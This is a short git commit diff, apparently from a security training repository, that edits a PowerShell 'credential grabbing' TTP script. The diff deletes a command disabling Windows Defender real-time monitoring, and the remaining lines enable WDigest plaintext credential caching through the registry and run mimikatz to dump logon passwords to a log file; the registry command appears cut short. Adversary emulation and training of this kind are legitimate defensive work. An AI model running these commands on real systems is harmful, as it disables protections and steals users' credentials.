68777052423b810d455736e84966d9f8a4166739
treyescairo-pluralsight <64978363+treyescairo-pluralsight@users.noreply.github.com>
2024-03-14 13:22:43 -0600

    Update ttps, launch

--- endpoint_attacks/credential_grabbing/ttp.ps1
+++ endpoint_attacks/credential_grabbing/ttp.ps1
@@ -1,5 +1,3 @@
-Set-MpPreference -DisableRealtimeMonitoring 1
-
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d
 
 . C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "exit"
